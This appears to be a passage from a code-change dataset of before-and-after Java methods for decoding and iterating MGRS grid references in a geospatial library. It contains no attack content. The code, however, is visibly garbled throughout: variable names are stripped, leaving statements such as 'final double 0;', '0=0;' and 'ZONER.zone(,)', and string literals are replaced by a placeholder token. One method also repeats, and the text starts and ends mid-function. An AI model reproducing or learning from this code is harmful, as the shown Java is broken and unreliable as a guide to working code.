isValid=( >= s - LATITUDE_BAND_HEIGHT / 2) && ( < upperBound(s));
if (isValid) {
int zoneError=ZONER.zone(,) - zone;
if (zoneError != 0) {
final int zc=ZONER.zoneCount();
if (zoneError > zc / 2) zoneError-=zc;
if (ZONER.isSpecialCase(zone,)) {
isValid=Math.abs(zoneError) == 1;
}
 else {
final double r=Math.IEEEremainder( - ZONER.origin,ZONER.width);
final double cv=(minX - ZONER.easting) / ( - 0);
isValid=(Math.abs(r) * cv <= sx);
if (isValid) {
isValid=(zoneError == (r < 0 ? -1 : +1));
}
}
}
}
}
if (isValid && owner.getClipToValidArea()) {
final boolean changed;
if (zone != 0) {
double width=ZONER.width;
if (!ZONER.isSpecialCase(zone,s)) width/=2;
changed=clipGeographicBoundingBox(0 - width,s,0 + width,upperBound(s));
}
 else if (s < 0) {
changed=clipGeographicBoundingBox(Longitude.MIN_VALUE,Latitude.MIN_VALUE,Longitude.MAX_VALUE,TransverseMercator.Zoner.SOUTH_BOUNDS);
}
 else {
changed=clipGeographicBoundingBox(Longitude.MIN_VALUE,TransverseMercator.Zoner.NORTH_BOUNDS,Longitude.MAX_VALUE,Latitude.MAX_VALUE);
}
if (changed) {
clipProjectedEnvelope(projection,sx / 100,sy / 100);
}
}
}
if (!isValid) {
final String gzd;
try {
gzd=owner.encoder(crs).encode(owner,getDirectPosition(),true,""String_Node_Str"",0);
}
 catch (IllegalArgumentException|FactoryException e) {
throw new GazetteerException(e.getLocalizedMessage(),e);
}
final CharSequence ref=reference.subSequence(base,end);
throw new ReferenceVerifyException(Resources.format(Resources.Keys.InconsistentWithGZD_2,ref,gzd));
}
}","/** 
 * Decodes the given MGRS reference.
 * @param owner  the {@code Coder} which is creating this {@code Decoder}.
 */
Decoder(final Coder owner,final CharSequence reference) throws TransformException {
  super(owner.getReferenceSystem().rootType(),reference);
  final int zone;
  boolean hasSquareIdentification;
  final double s;
  final double 0;
  boolean isValid=true;
  final int end=CharSequences.skipTrailingWhitespaces(reference,0,reference.length());
  final int base=CharSequences.skipLeadingWhitespaces(reference,0,end);
  int i=endOfDigits(reference,base,end);
  if (i == base && i < end) {
    zone=0;
    boolean south=false;
    boolean west=false;
    int col=0, row=0;
    for (int part=0; part <= 2; part++) {
      int c=Character.codePointAt(reference,i);
      final int ni=i + Character.charCount(c);
      if (isLetter(c) || isLetter(c-=('a' - 'A'))) {
        parse: switch (part) {
case 0:
{
switch (c) {
case 'A':
              south=true;
            west=true;
          break;
case 'B':
        south=true;
      break;
case 'Y':
    west=true;
  break;
case 'Z':
break;
default :
break parse;
}
i=nextComponent(owner,reference,base,ni,end);
continue;
}
case 1:
{
col=Arrays.binarySearch(POLAR_COLUMNS,(byte)c);
if (col < 0) break;
if (west) col-=POLAR_COLUMNS.length;
col+=PolarStereographicA.UPS_SHIFT / GRID_SQUARE_SIZE;
i=nextComponent(owner,reference,base,ni,end);
continue;
}
case 2:
{
if (c >= EXCLUDE_O) c--;
if (c >= EXCLUDE_I) c--;
row=(c - 'A') + owner.getReferenceSystem().polarOffset(south);
i=ni;
continue;
}
}
}
final short key;
final CharSequence token;
if (part == 0) {
key=Resources.Keys.IllegalUPSZone_1;
token=reference.subSequence(i,ni);
}
 else {
key=Resources.Keys.IllegalSquareIdentification_1;
token=CharSequences.token(reference,i);
}
throw new GazetteerException(Resources.format(key,token));
}
crs=owner.projection(s=(south ? Latitude.MIN_VALUE : Latitude.MAX_VALUE),0);
minX=col * GRID_SQUARE_SIZE;
minY=row * GRID_SQUARE_SIZE;
hasSquareIdentification=true;
0=0;
}
 else {
zone=parseInt(reference,base,i,Resources.Keys.IllegalUTMZone_1);
if (zone < 1 || zone > 60) {
throw new GazetteerException(Resources.format(Resources.Keys.IllegalUTMZone_1,zone));
}
int latitudeBand=-1;
int col=1, row=0;
hasSquareIdentification=true;
for (int part=0; part <= 2; part++) {
if (part == 1 && i >= end) {
hasSquareIdentification=false;
break;
}
i=nextComponent(owner,reference,base,i,end);
int c=Character.codePointAt(reference,i);
final int ni=i + Character.charCount(c);
if (!isLetter(c) && !isLetter(c-=('a' - 'A'))) {
final short key;
final CharSequence token;
if (part == 0) {
key=Resources.Keys.IllegalLatitudeBand_1;
token=reference.subSequence(i,ni);
}
 else {
key=Resources.Keys.IllegalSquareIdentification_1;
token=CharSequences.token(reference,i);
}
throw new GazetteerException(Resources.format(key,token));
}
if (c >= EXCLUDE_O) c--;
if (c >= EXCLUDE_I) c--;
switch (part) {
case 0:
{
latitudeBand=(c - 'C');
break;
}
case 1:
{
switch (zone % 3) {
case 1:
col=c - ('A' - 1);
break;
case 2:
col=c - ('J' - 2);
break;
case 0:
col=c - ('S' - 3);
break;
}
break;
}
case 2:
{
if ((zone & 1) != 0) {
row=c - 'A';
}
 else {
row=c - 'F';
if (row < 0) {
row+=GRID_ROW_COUNT;
}
}
break;
}
}
i=ni;
}
s=latitudeBand * LATITUDE_BAND_HEIGHT + TransverseMercator.Zoner.SOUTH_BOUNDS;
if (latitudeBand < 0 || latitudeBand >= ROW_RESOLVER.length) {
throw new GazetteerException(Resources.format(Resources.Keys.IllegalLatitudeBand_1,Encoder.latitudeBand(s)));
}
0=ZONER.centralMeridian(zone);
crs=owner.projection(Math.signum(s),0);
final int info=ROW_RESOLVER[latitudeBand];
if (hasSquareIdentification) {
int rowBit=1 << (row + NORTHING_BITS_COUNT);
isValid=(info & rowBit) != 0;
if (isValid) {
rowBit=Integer.lowestOneBit(~(info | (rowBit - 1)));
}
if ((info & -rowBit) != 0) {
row+=GRID_ROW_COUNT;
}
}
row+=(info & NORTHING_BITS_MASK) * GRID_ROW_COUNT;
minX=col * GRID_SQUARE_SIZE;
minY=row * GRID_SQUARE_SIZE;
}
final double sx, sy;
if (i < end) {
i=nextComponent(owner,reference,base,i,end);
int s=endOfDigits(reference,i,end);
final double x, y;
if (s >= end) {
int length=s - i;
if ((length & 1) != 0) {
throw new GazetteerException(Resources.format(Resources.Keys.OddGridCoordinateLength_1,reference.subSequence(i,s)));
}
final int h=i + (length>>>=1);
sx=sy=MathFunctions.pow10(METRE_PRECISION_DIGITS - length);
x=parseCoordinate(reference,i,h,sx);
y=parseCoordinate(reference,h,s,sy);
}
 else {
sx=MathFunctions.pow10(METRE_PRECISION_DIGITS - (s - i));
x=parseCoordinate(reference,i,s,sx);
i=nextComponent(owner,reference,base,s,end);
s=endOfDigits(reference,i,end);
sy=MathFunctions.pow10(METRE_PRECISION_DIGITS - (s - i));
y=parseCoordinate(reference,i,s,sy);
if (s < end) {
throw new GazetteerException(Errors.format(Errors.Keys.UnexpectedCharactersAfter_2,reference.subSequence(base,s),CharSequences.trimWhitespaces(reference,s,end)));
}
}
minX+=x;
minY+=y;
}
 else if (hasSquareIdentification) {
sx=sy=GRID_SQUARE_SIZE;
}
 else {
sx=(ZONER.easting - GRID_SQUARE_SIZE) * 2;
sy=ZONER.northing;
}
maxX=minX + sx;
maxY=minY + sy;
if (!hasSquareIdentification) {
if (zone != 0) {
if (s < 0) {
southBoundLatitude=TransverseMercator.Zoner.SOUTH_BOUNDS;
northBoundLatitude=0;
}
 else {
southBoundLatitude=0;
northBoundLatitude=TransverseMercator.Zoner.NORTH_BOUNDS;
}
westBoundLongitude=0 - ZONER.width / 2;
eastBoundLongitude=0 + ZONER.width / 2;
}
 else {
if (s < 0) {
southBoundLatitude=Latitude.MIN_VALUE;
northBoundLatitude=TransverseMercator.Zoner.SOUTH_BOUNDS;
}
 else {
southBoundLatitude=TransverseMercator.Zoner.NORTH_BOUNDS;
northBoundLatitude=Latitude.MAX_VALUE;
}
westBoundLongitude=Longitude.MIN_VALUE;
eastBoundLongitude=Longitude.MAX_VALUE;
}
}
 else {
final MathTransform projection=crs.getConversionFromBase().getMathTransform();
computeGeographicBoundingBox(projection.inverse());
setTypeToChild();
if (sx < GRID_SQUARE_SIZE || sy < GRID_SQUARE_SIZE) {
setTypeToChild();
}
if (isValid && zone != 0) {
isValid=(northBoundLatitude >= s) && (southBoundLatitude < upperBound(s));
if (isValid) {
final double =(westBoundLongitude + eastBoundLongitude) / 2;
final double =(southBoundLatitude + northBoundLatitude) / 2;
int zoneError=ZONER.zone(,) - zone;
if (zoneError != 0) {
final int zc=ZONER.zoneCount();
if (zoneError > zc / 2) zoneError-=zc;
if (ZONER.isSpecialCase(zone,)) {
isValid=Math.abs(zoneError) == 1;
}
 else {
final double r=Math.IEEEremainder( - ZONER.origin,ZONER.width);
final double cv=(minX - ZONER.easting) / ( - 0);
isValid=(Math.abs(r) * cv <= sx);
if (isValid) {
isValid=(zoneError == (r < 0 ? -1 : +1));
}
}
}
}
}
if (isValid && owner.getClipToValidArea()) {
final boolean changed;
if (zone != 0) {
double width=ZONER.width;
if (!ZONER.isSpecialCase(zone,s)) width/=2;
changed=clipGeographicBoundingBox(0 - width,s,0 + width,upperBound(s));
}
 else if (s < 0) {
changed=clipGeographicBoundingBox(Longitude.MIN_VALUE,Latitude.MIN_VALUE,Longitude.MAX_VALUE,TransverseMercator.Zoner.SOUTH_BOUNDS);
}
 else {
changed=clipGeographicBoundingBox(Longitude.MIN_VALUE,TransverseMercator.Zoner.NORTH_BOUNDS,Longitude.MAX_VALUE,Latitude.MAX_VALUE);
}
if (changed) {
clipProjectedEnvelope(projection,sx / 100,sy / 100);
}
}
}
if (!isValid) {
final String gzd;
try {
gzd=owner.encoder(crs).encode(owner,getDirectPosition(),true,""String_Node_Str"",0);
}
 catch (IllegalArgumentException|FactoryException e) {
throw new GazetteerException(e.getLocalizedMessage(),e);
}
final CharSequence ref=reference.subSequence(base,end);
throw new ReferenceVerifyException(Resources.format(Resources.Keys.InconsistentWithGZD_2,ref,gzd));
}
}"
91724,"/** 
 * Implementation of   {@link #tryAdvance(Consumer)} and {@link #forEachRemaining(Consumer)}.
 */
private boolean advance(final Consumer<? super String> action,final boolean all){
  final int digits=digits();
  final String separator=getSeparator();
  if (normalized == null) {
    normalized=new DirectPosition2D();
  }
  boolean found=false;
  try {
    do {
      cell.setRect(gridX,gridY,step,step);
      if (areaOfInterest.intersects(Shapes2D.transform(gridToAOI,cell,cell))) {
        int x=gridX;
        int y=gridY;
        normalized.setOrdinate(0,x);
        normalized.setOrdinate(1,y);
        final String ref=encoder.encode(this,normalized,false,separator,digits);
        if (ref != null) {
          action.accept(ref);
          found=true;
        }
      }
      if ((gridX+=step) >= xEnd) {
        gridX=xStart;
        if (encoder.crsZone >= 0) {
          if ((gridY+=step) >= yEnd)           break;
        }
 else {
          if ((gridY-=step) <= yEnd)           break;
        }
      }
    }
 while (all || !found);
  }
 catch (  FactoryException|TransformException e) {
    throw (ArithmeticException)new ArithmeticException(Errors.format(Errors.Keys.OutsideDomainOfValidity)).initCause(e);
  }
  return found;
}","/** 
 * Implementation of   {@link #tryAdvance(Consumer)} and {@link #forEachRemaining(Consumer)}. The   {@code all}argument specifies whether this method is invoked for a single element or for all remaining ones.
 */
private boolean advance(final Consumer<? super String> action,final boolean all){
  final int digits=digits();
  final String separator=getSeparator();
  if (normalized == null) {
    normalized=new DirectPosition2D();
  }
  boolean found=false;
  try {
    do {
      cell.setRect(gridX,gridY,step,step);
      if (areaOfInterest.intersects(Shapes2D.transform(gridToAOI,cell,cell))) {
        int x=gridX;
        if (x < xCenter) {
          x+=step - 1;
        }
        normalized.setOrdinate(0,x);
        normalized.setOrdinate(1,gridY);
        final String ref=encoder.encode(this,normalized,false,separator,digits);
        if (ref != null) {
          action.accept(ref);
          found=true;
        }
      }
 else       if (optimize) {
        if (gridX < xCenter) {
          xStart=gridX + step;
        }
 else {
          xEnd=gridX;
        }
      }
      if ((gridX+=step) >= xEnd) {
        gridX=xStart;
        if (!downward) {
          if ((gridY+=step) >= yEnd)           break;
        }
 else {
          if ((gridY-=step) <= yEnd)           break;
        }
      }
    }
 while (all || !found);
  }
 catch (  FactoryException|TransformException e) {
    throw (ArithmeticException)new ArithmeticException(Errors.format(Errors.Keys.OutsideDomainOfValidity)).initCause(e);
  }
  return found;
}"
91725,"/** 
 * Returns a new iterator for creating MGRS codes in a single UTM or UPS zone.
 * @param areaOfInterest  the envelope for which to return MGRS codes. This envelope can be in any CRS.
 * @param geographicArea  the area of interest transformed into a normalized geographic CRS.
 * @param sourceCRS       the horizontal part of the {@code areaOfInterest} CRS.
 * @param targetCRS       the UTM or UPS projected CRS of the zone for which to create MGRS references.
 * @param step            the amount of metres to add or subtract to grid coordinates during iteration.
 */
IteratorOneZone(final Coder coder,Rectangle2D areaOfInterest,final Envelope geographicArea,final SingleCRS sourceCRS,final ProjectedCRS targetCRS,final int step) throws FactoryException, TransformException {
  super(coder);
  this.areaOfInterest=areaOfInterest;
  this.encoder=encoder(targetCRS);
  this.step=step;
  this.cell=new IntervalRectangle();
  final int zone=Math.abs(encoder.crsZone);
  if (zone == Encoder.POLE) {
    if (encoder.crsZone < 0) {
      cell.ymin=Latitude.MIN_VALUE;
      cell.ymax=TransverseMercator.Zoner.SOUTH_BOUNDS;
    }
 else {
      cell.ymin=TransverseMercator.Zoner.NORTH_BOUNDS;
      cell.ymax=Latitude.MAX_VALUE;
    }
    cell.xmin=Longitude.MIN_VALUE;
    cell.xmax=Longitude.MAX_VALUE;
  }
 else {
    if (encoder.crsZone < 0) {
      cell.ymin=TransverseMercator.Zoner.SOUTH_BOUNDS;
    }
 else {
      cell.ymax=TransverseMercator.Zoner.NORTH_BOUNDS;
    }
    final double 0=ZONER.centralMeridian(zone);
    cell.xmin=0 - ZONER.width;
    cell.xmax=0 + ZONER.width;
  }
  double t;
  boolean clip=false;
  if ((t=geographicArea.getMinimum(1)) >= cell.ymin)   cell.ymin=t;
 else   clip=true;
  if ((t=geographicArea.getMaximum(1)) <= cell.ymax)   cell.ymax=t;
 else   clip=true;
  if ((t=geographicArea.getMinimum(0)) >= cell.xmin)   cell.xmin=t;
 else   clip=true;
  if ((t=geographicArea.getMaximum(0)) <= cell.xmax)   cell.xmax=t;
 else   clip=true;
  if (clip) {
    final Rectangle2D bounds=Shapes2D.transform(CRS.findOperation(geographicArea.getCoordinateReferenceSystem(),sourceCRS,null),cell,cell);
    areaOfInterest=bounds.createIntersection(areaOfInterest);
  }
  final MathTransform2D op=(MathTransform2D)CRS.findOperation(sourceCRS,targetCRS,null).getMathTransform();
  final Rectangle2D bounds=Shapes2D.transform(op,areaOfInterest,null);
  gridX=(((int)(bounds.getMinX() / step))) * step;
  gridY=(((int)(bounds.getMinY() / step))) * step;
  xEnd=(((int)(bounds.getMaxX() / step)) + 1) * step;
  yEnd=(((int)(bounds.getMaxY() / step)) + 1) * step;
  xStart=gridX;
  if (encoder.crsZone < 0) {
    final int y=gridY;
    gridY=yEnd - step;
    yEnd=y - step;
  }
  gridToAOI=op.inverse();
}","/** 
 * Returns a new iterator for creating MGRS codes in a single UTM or UPS zone.
 * @param areaOfInterest  the envelope for which to return MGRS codes. This envelope can be in any CRS.
 * @param geographicArea  the area of interest transformed into a normalized geographic CRS.
 * @param sourceCRS       the horizontal part of the {@code areaOfInterest} CRS.
 * @param targetCRS       the UTM or UPS projected CRS of the zone for which to create MGRS references.
 * @param step            the amount of metres to add or subtract to grid coordinates during iteration.
 */
IteratorOneZone(final Coder coder,Rectangle2D areaOfInterest,final Envelope geographicArea,final SingleCRS sourceCRS,final ProjectedCRS targetCRS,final int step) throws FactoryException, TransformException {
  super(coder);
  this.areaOfInterest=areaOfInterest;
  this.encoder=encoder(targetCRS);
  this.step=step;
  this.cell=new IntervalRectangle();
  final int zone=Math.abs(encoder.crsZone);
  if (zone == Encoder.POLE) {
    xCenter=PolarStereographicA.UPS_SHIFT;
    if (encoder.crsZone < 0) {
      cell.ymin=Latitude.MIN_VALUE;
      cell.ymax=TransverseMercator.Zoner.SOUTH_BOUNDS;
    }
 else {
      cell.ymin=TransverseMercator.Zoner.NORTH_BOUNDS;
      cell.ymax=Latitude.MAX_VALUE;
    }
    cell.xmin=Longitude.MIN_VALUE;
    cell.xmax=Longitude.MAX_VALUE;
  }
 else {
    xCenter=(int)ZONER.easting;
    if (encoder.crsZone < 0) {
      cell.ymin=TransverseMercator.Zoner.SOUTH_BOUNDS;
    }
 else {
      cell.ymax=TransverseMercator.Zoner.NORTH_BOUNDS;
    }
    final double 0=ZONER.centralMeridian(zone);
    cell.xmin=0 - ZONER.width;
    cell.xmax=0 + ZONER.width;
  }
  double t;
  boolean clip=false;
  if ((t=geographicArea.getMinimum(1)) >= cell.ymin)   cell.ymin=t;
 else   clip=true;
  if ((t=geographicArea.getMaximum(1)) <= cell.ymax)   cell.ymax=t;
 else   clip=true;
  if ((t=geographicArea.getMinimum(0)) >= cell.xmin)   cell.xmin=t;
 else   clip=true;
  if ((t=geographicArea.getMaximum(0)) <= cell.xmax)   cell.xmax=t;
 else   clip=true;
  boolean isSpecialCase=ZONER.isSpecialCase(cell.ymin,cell.ymax,cell.xmin,cell.xmax);
  if (clip) {
    final Rectangle2D bounds=Shapes2D.transform(CRS.findOperation(geographicArea.getCoordinateReferenceSystem(),sourceCRS,null),cell,cell);
    areaOfInterest=bounds.createIntersection(areaOfInterest);
  }
  final MathTransform2D op=(MathTransform2D)CRS.findOperation(sourceCRS,targetCRS,null).getMathTransform();
  final Rectangle2D bounds=Shapes2D.transform(op,areaOfInterest,null);
  gridX=(((int)(bounds.getMinX() / step))) * step;
  gridY=(((int)(bounds.getMinY() / step))) * step;
  xEnd=(((int)(bounds.getMaxX() / step)) + 1) * step;
  yEnd=(((int)(bounds.getMaxY() / step)) + 1) * step;
  xStart=gridX;
  if (zone != Encoder.POLE) {
    downward=(encoder.crsZone < 0);
  }
 else {
    downward=yEnd <= PolarStereographicA.UPS_SHIFT;
    if (!downward && gridY < PolarStereographicA.UPS_SHIFT) {
      isSpecialCase=true;
    }
  }
  if (downward) {
    final int y=gridY;
    gridY=yEnd - step;
    yEnd=y - step;
  }
  optimize=!isSpecialCase && Utilities.equalsIgnoreMetadata(geographicArea.getCoordinateReferenceSystem(),sourceCRS);
  gridToAOI=op.inverse();
}"
91726,"/** 
 * Decodes the given MGRS reference.
 * @param owner  the {@code Coder} which is creating this {@code Decoder}.
 */
Decoder(final Coder owner,final CharSequence reference) throws TransformException {
  super(owner.getReferenceSystem().rootType(),reference);
  final int zone;
  boolean hasSquareIdentification;
  final double s;
  final double 0;
  boolean isValid=true;
  final int end=CharSequences.skipTrailingWhitespaces(reference,0,reference.length());
  final int base=CharSequences.skipLeadingWhitespaces(reference,0,end);
  int i=endOfDigits(reference,base,end);
  if (i == base && i < end) {
    zone=0;
    boolean south=false;
    boolean west=false;
    int col=0, row=0;
    for (int part=0; part <= 2; part++) {
      int c=Character.codePointAt(reference,i);
      final int ni=i + Character.charCount(c);
      if (isLetter(c) || isLetter(c-=('a' - 'A'))) {
        parse: switch (part) {
case 0:
{
switch (c) {
case 'A':
              south=true;
            west=true;
          break;
case 'B':
        south=true;
      break;
case 'Y':
    west=true;
  break;
case 'Z':
break;
default :
break parse;
}
i=nextComponent(owner,reference,base,ni,end);
continue;
}
case 1:
{
col=Arrays.binarySearch(POLAR_COLUMNS,(byte)c);
if (col < 0) break;
if (west) col-=POLAR_COLUMNS.length;
col+=PolarStereographicA.UPS_SHIFT / GRID_SQUARE_SIZE;
i=nextComponent(owner,reference,base,ni,end);
continue;
}
case 2:
{
if (c >= EXCLUDE_O) c--;
if (c >= EXCLUDE_I) c--;
row=(c - 'A') + owner.getReferenceSystem().polarOffset(south);
i=ni;
continue;
}
}
}
final short key;
final CharSequence token;
if (part == 0) {
key=Resources.Keys.IllegalUPSZone_1;
token=reference.subSequence(i,ni);
}
 else {
key=Resources.Keys.IllegalSquareIdentification_1;
token=CharSequences.token(reference,i);
}
throw new GazetteerException(Resources.format(key,token));
}
crs=owner.projection(s=(south ? Latitude.MIN_VALUE : Latitude.MAX_VALUE),0);
minX=col * GRID_SQUARE_SIZE;
minY=row * GRID_SQUARE_SIZE;
hasSquareIdentification=true;
0=0;
}
 else {
zone=parseInt(reference,base,i,Resources.Keys.IllegalUTMZone_1);
if (zone < 1 || zone > 60) {
throw new GazetteerException(Resources.format(Resources.Keys.IllegalUTMZone_1,zone));
}
int latitudeBand=-1;
int col=1, row=0;
hasSquareIdentification=true;
for (int part=0; part <= 2; part++) {
if (part == 1 && i >= end) {
hasSquareIdentification=false;
break;
}
i=nextComponent(owner,reference,base,i,end);
int c=Character.codePointAt(reference,i);
final int ni=i + Character.charCount(c);
if (!isLetter(c) && !isLetter(c-=('a' - 'A'))) {
final short key;
final CharSequence token;
if (part == 0) {
key=Resources.Keys.IllegalLatitudeBand_1;
token=reference.subSequence(i,ni);
}
 else {
key=Resources.Keys.IllegalSquareIdentification_1;
token=CharSequences.token(reference,i);
}
throw new GazetteerException(Resources.format(key,token));
}
if (c >= EXCLUDE_O) c--;
if (c >= EXCLUDE_I) c--;
switch (part) {
case 0:
{
latitudeBand=(c - 'C');
break;
}
case 1:
{
switch (zone % 3) {
case 1:
col=c - ('A' - 1);
break;
case 2:
col=c - ('J' - 2);
break;
case 0:
col=c - ('S' - 3);
break;
}
break;
}
case 2:
{
if ((zone & 1) != 0) {
row=c - 'A';
}
 else {
row=c - 'F';
if (row < 0) {
row+=GRID_ROW_COUNT;
}
}
break;
}
}
i=ni;
}
s=latitudeBand * LATITUDE_BAND_HEIGHT + TransverseMercator.Zoner.SOUTH_BOUNDS;
if (latitudeBand < 0 || latitudeBand >= ROW_RESOLVER.length) {
throw new GazetteerException(Resources.format(Resources.Keys.IllegalLatitudeBand_1,Encoder.latitudeBand(s)));
}
0=ZONER.centralMeridian(zone);
crs=owner.projection(Math.signum(s),0);
final int info=ROW_RESOLVER[latitudeBand];
if (hasSquareIdentification) {
int rowBit=1 << (row + NORTHING_BITS_COUNT);
isValid=(info & rowBit) != 0;
if (isValid) {
rowBit=Integer.lowestOneBit(~(info | (rowBit - 1)));
}
if ((info & -rowBit) != 0) {
row+=GRID_ROW_COUNT;
}
}
row+=(info & NORTHING_BITS_MASK) * GRID_ROW_COUNT;
minX=col * GRID_SQUARE_SIZE;
minY=row * GRID_SQUARE_SIZE;
}
final double sx, sy;
if (i < end) {
i=nextComponent(owner,reference,base,i,end);
int s=endOfDigits(reference,i,end);
final double x, y;
if (s >= end) {
int length=s - i;
if ((length & 1) != 0) {
throw new GazetteerException(Resources.format(Resources.Keys.OddGridCoordinateLength_1,reference.subSequence(i,s)));
}
final int h=i + (length>>>=1);
sx=sy=MathFunctions.pow10(METRE_PRECISION_DIGITS - length);
x=parseCoordinate(reference,i,h,sx);
y=parseCoordinate(reference,h,s,sy);
}
 else {
sx=MathFunctions.pow10(METRE_PRECISION_DIGITS - (s - i));
x=parseCoordinate(reference,i,s,sx);
i=nextComponent(owner,reference,base,s,end);
s=endOfDigits(reference,i,end);
sy=MathFunctions.pow10(METRE_PRECISION_DIGITS - (s - i));
y=parseCoordinate(reference,i,s,sy);
if (s < end) {
throw new GazetteerException(Errors.format(Errors.Keys.UnexpectedCharactersAfter_2,reference.subSequence(base,s),CharSequences.trimWhitespaces(reference,s,end)));
}
}
minX+=x;
minY+=y;
}
 else if (hasSquareIdentification) {
sx=sy=GRID_SQUARE_SIZE;
}
 else {
sx=(ZONER.easting - GRID_SQUARE_SIZE) * 2;
sy=ZONER.northing;
}
maxX=minX + sx;
maxY=minY + sy;
if (!hasSquareIdentification) {
if (zone != 0) {
if (s < 0) {
southBoundLatitude=TransverseMercator.Zoner.SOUTH_BOUNDS;
northBoundLatitude=0;
}
 else {
southBoundLatitude=0;
northBoundLatitude=TransverseMercator.Zoner.NORTH_BOUNDS;
}
westBoundLongitude=0 - ZONER.width / 2;
eastBoundLongitude=0 + ZONER.width / 2;
}
 else {
if (s < 0) {
southBoundLatitude=Latitude.MIN_VALUE;
northBoundLatitude=TransverseMercator.Zoner.SOUTH_BOUNDS;
}
 else {
southBoundLatitude=TransverseMercator.Zoner.NORTH_BOUNDS;
northBoundLatitude=Latitude.MAX_VALUE;
}
westBoundLongitude=Longitude.MIN_VALUE;
eastBoundLongitude=Longitude.MAX_VALUE;
}
}
 else {
final MathTransform projection=crs.getConversionFromBase().getMathTransform();
computeGeographicBoundingBox(projection.inverse());
setTypeToChild();
if (sx < GRID_SQUARE_SIZE || sy < GRID_SQUARE_SIZE) {
setTypeToChild();
}
if (isValid && zone != 0) {
isValid=(northBoundLatitude >= s) && (southBoundLatitude < upperBound(s));
if (isValid) {
final double =(westBoundLongitude + eastBoundLongitude) / 2;
final double =(southBoundLatitude + northBoundLatitude) / 2;
int zoneError=ZONER.zone(,) - zone;
if (zoneError != 0) {
final int zc=ZONER.zoneCount();
if (zoneError > zc / 2) zoneError-=zc;
if (ZONER.isSpecialCase(zone,)) {
isValid=Math.abs(zoneError) == 1;
}
 else {
final double r=Math.IEEEremainder( - ZONER.origin,ZONER.width);
final double cv=(minX - ZONER.easting) / ( - 0);
isValid=(Math.abs(r) * cv <= sx);
if (isValid) {
isValid=(zoneError == (r < 0 ? -1 : +1));
}
}
}
}
}
if (isValid && owner.getClipToValidArea()) {
final boolean changed;
if (zone != 0) {
double width=ZONER.width;
if (!ZONER.isSpecialCase(zone,s)) width/=2;
changed=clipGeographicBoundingBox(0 - width,s,0 + width,upperBound(s));
}
 else if (s < 0) {
changed=clipGeographicBoundingBox(Longitude.MIN_VALUE,Latitude.MIN_VALUE,Longitude.MAX_VALUE,TransverseMercator.Zoner.SOUTH_BOUNDS);
}
 else {
changed=clipGeographicBoundingBox(Longitude.MIN_VALUE,TransverseMercator.Zoner.NORTH_BOUNDS,Longitude.MAX_VALUE,Latitude.MAX_VALUE);
}
if (changed) {
clipProjectedEnvelope(projection,sx / 100,sy / 100);
}
}
}
if (!isValid) {
final String gzd;
try {
gzd=owner.encoder(crs).encode(owner,getDirectPosition(),true,""String_Node_Str"",0);
}
 catch (IllegalArgumentException|FactoryException e) {
throw new GazetteerException(e.getLocalizedMessage(),e);
}
final CharSequence ref=reference.subSequence(base,end);
throw new ReferenceVerifyException(Resources.format(Resources.Keys.InconsistentWithGZD_2,ref,gzd));
}
}","/** 
 * Decodes the given MGRS reference.
 * @param owner  the {@code Coder} which is creating this {@code Decoder}.
 */
Decoder(final Coder owner,final CharSequence reference) throws TransformException {
  super(owner.getReferenceSystem().rootType(),reference);
  final int zone;
  boolean hasSquareIdentification;
  final double s;
  final double 0;
  boolean isValid=true;
  final int end=CharSequences.skipTrailingWhitespaces(reference,0,reference.length());
  final int base=CharSequences.skipLeadingWhitespaces(reference,0,end);
  int i=endOfDigits(reference,base,end);
  if (i == base && i < end) {
    zone=0;
    boolean south=false;
    boolean west=false;
    int col=0, row=0;
    for (int part=0; part <= 2; part++) {
      int c=Character.codePointAt(reference,i);
      final int ni=i + Character.charCount(c);
      if (isLetter(c) || isLetter(c-=('a' - 'A'))) {
        parse: switch (part) {
case 0:
{
switch (c) {
case 'A':
              south=true;
            west=true;
          break;
case 'B':
        south=true;
      break;
case 'Y':
    west=true;
  break;
case 'Z':
break;
default :
break parse;
}
i=nextComponent(owner,reference,base,ni,end);
continue;
}
case 1:
{
col=Arrays.binarySearch(POLAR_COLUMNS,(byte)c);
if (col < 0) break;
if (west) col-=POLAR_COLUMNS.length;
col+=PolarStereographicA.UPS_SHIFT / GRID_SQUARE_SIZE;
i=nextComponent(owner,reference,base,ni,end);
continue;
}
case 2:
{
if (c >= EXCLUDE_O) c--;
if (c >= EXCLUDE_I) c--;
row=(c - 'A') + owner.getReferenceSystem().polarOffset(south);
i=ni;
continue;
}
}
}
final short key;
final CharSequence token;
if (part == 0) {
key=Resources.Keys.IllegalUPSZone_1;
token=reference.subSequence(i,ni);
}
 else {
key=Resources.Keys.IllegalSquareIdentification_1;
token=CharSequences.token(reference,i);
}
throw new GazetteerException(Resources.format(key,token));
}
crs=owner.projection(s=(south ? Latitude.MIN_VALUE : Latitude.MAX_VALUE),0);
minX=col * GRID_SQUARE_SIZE;
minY=row * GRID_SQUARE_SIZE;
hasSquareIdentification=true;
0=0;
}
 else {
zone=parseInt(reference,base,i,Resources.Keys.IllegalUTMZone_1);
if (zone < 1 || zone > 60) {
throw new GazetteerException(Resources.format(Resources.Keys.IllegalUTMZone_1,zone));
}
int latitudeBand=-1;
int col=1, row=0;
hasSquareIdentification=true;
for (int part=0; part <= 2; part++) {
if (part == 1 && i >= end) {
hasSquareIdentification=false;
break;
}
i=nextComponent(owner,reference,base,i,end);
int c=Character.codePointAt(reference,i);
final int ni=i + Character.charCount(c);
if (!isLetter(c) && !isLetter(c-=('a' - 'A'))) {
final short key;
final CharSequence token;
if (part == 0) {
key=Resources.Keys.IllegalLatitudeBand_1;
token=reference.subSequence(i,ni);
}
 else {
key=Resources.Keys.IllegalSquareIdentification_1;
token=CharSequences.token(reference,i);
}
throw new GazetteerException(Resources.format(key,token));
}
if (c >= EXCLUDE_O) c--;
if (c >= EXCLUDE_I) c--;
switch (part) {
case 0:
{
latitudeBand=(c - 'C');
break;
}
case 1:
{
switch (zone % 3) {
case 1:
col=c - ('A' - 1);
break;
case 2:
col=c - ('J' - 2);
break;
case 0:
col=c - ('S' - 3);
break;
}
break;
}
case 2:
{
if ((zone & 1) != 0) {
row=c - 'A';
}
 else {
row=c - 'F';
if (row < 0) {
row+=GRID_ROW_COUNT;
}
}
break;
}
}
i=ni;
}
s=latitudeBand * LATITUDE_BAND_HEIGHT + TransverseMercator.Zoner.SOUTH_BOUNDS;
if (latitudeBand < 0 || latitudeBand >= ROW_RESOLVER.length) {
throw new GazetteerException(Resources.format(Resources.Keys.IllegalLatitudeBand_1,Encoder.latitudeBand(s)));
}
0=ZONER.centralMeridian(zone);
crs=owner.projection(Math.signum(s),0);
final int info=ROW_RESOLVER[latitudeBand];
